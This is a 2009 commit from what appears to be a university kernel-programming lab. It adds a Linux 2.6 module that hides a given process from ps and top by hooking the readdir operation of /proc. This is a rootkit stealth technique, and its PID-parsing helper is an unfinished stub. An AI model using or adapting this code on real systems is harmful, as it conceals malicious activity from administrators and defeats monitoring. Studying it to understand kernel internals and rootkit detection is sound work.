f72c14f524dadf19612c5ce438834b10ff7ee1fe
afkkir <afkkir@c31d7dd1-924f-0410-9ef4-6524c54d5c44>
2009-10-25 21:25:27 +0000

    ajout de la version 2 de hideModule. Cette version cache un processus aux outils types top et ps

---
+++ M2/V1/nmv/tmes/tme2/hideModule-v2/hideModule-v2.c
@@ -0,0 +1,122 @@
+/*
+ * =====================================================================================
+ *
+ *       Filename:  hideModule-3-2.c
+ *
+ *    Description:  Module "module cache" pour noyau 2.6 
+ *
+ *        Version:  1.0
+ *        Created:  09/10/2009 13:53:46
+ *       Revision:  none
+ *       Compiler:  gcc
+ *
+ *        Authors:  A. Rachid, C. Monir, 
+ *        Company:  UPMC
+ *
+ * =====================================================================================
+ */
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/list.h>
+#include <linux/module.h>
+#include <linux/proc_fs.h>
+#include <linux/fs.h>
+
+MODULE_DESCRIPTION("Module \"hide module\" pour noyau 2.6");
+MODULE_AUTHOR("A. Rachid, C. Monir, UPMC");
+MODULE_LICENSE("GPL");
+
+
+/*
+ * HEADERS
+ */
+int my_readdir(struct file *fp, void *buf, filldir_t filldir);
+/* utilisation de u64 pour eviter les warrning du gcc */
+int my_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x);
+
+
+/* 
+ * variables globales
+ */
+struct file_operations * proc_fops_global = NULL;
+/* stocker la ref vers la vraie fonction readdir */
+int (*readdir_old_global)(struct file *, void *, filldir_t);
+/* stocker la ref vers la vraie fonction filldir */
+filldir_t filldir_old_global;
+
+
+/*
+ * PARAMETRES DU MODULES
+ */
+/* pid du processus qu'on veut cacher */
+static int pid =8200;
+module_param(pid, int, 0);
+
+/* renvoie l'objet representant /proc */
+struct proc_dir_entry * find_proc_entry(void){
+  struct proc_dir_entry *pere_1 = NULL;
+  struct proc_dir_entry *pere = NULL;
+  char * name = "hideProcess_tmp";
+  struct proc_dir_entry *tmp = create_proc_entry(name, 0444, pere_1);
+  printk(KERN_ALERT "[DEBUG] pere_1 = %p\n", pere_1);
+  pere =  tmp->parent;
+  printk(KERN_ALERT "[DEBUG] pere = %p\n", pere);
+  printk(KERN_ALERT "[DEBUG] name = %s\n", tmp->name);
+  remove_proc_entry(tmp->name, NULL);
+  return pere;
+}
+
+
+int _atoi(const char *arg){
+  /* TODO */
+  return 0;
+}
+
+int my_readdir(struct file *fp, void *buf, filldir_t filldir){  
+  /* sauvegarder la ref vers la vraie fonction filldir */
+  filldir_old_global = filldir;
+  return (*readdir_old_global)(fp, buf, my_filldir);
+}
+
+
+int my_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x){
+  /* si le pid courant est celui du processus qu'on veut cacher */
+  if (_atoi(name) == pid){
+    /* dans ce cas on retourne 0. */
+    /* Tous les outils style top et ps n'afficheront pas */
+    /* ce processus car il n'existe pas pour eux */
+    return 0;
+  }
+  /* sinon on appelle la vraie filldir */
+  return (*filldir_old_global)(buf, name, nlen, off, ino, x);
+}
+
+
+static int hello_init(void)
+{
+  /* trouver la refernce vers l'objet dir_entry de /proc      */
+  /* A partir de cette objet on peut trouver la ref vers      */
+  /* la liste des operations sur les fichiers file_operations */
+  struct proc_dir_entry * proc = find_proc_entry();
+  proc_fops_global = (struct file_operations *) proc->proc_fops;
+  /* la vraie fonction readdir */
+  readdir_old_global = proc_fops_global->readdir;
+  proc_fops_global->readdir = my_readdir;
+  
+  printk(KERN_ALERT "Je suis le module cache\n");
+  return 0;
+}
+
+
+static void hello_exit(void)
+{
+  /* avant de enlever le module, revenir au comportement normal */
+  proc_fops_global->readdir = readdir_old_global;
+  printk(KERN_ALERT "Goodbye, cruel world\n");
+}
+
+module_init(hello_init);
+
+module_exit(hello_exit);
+
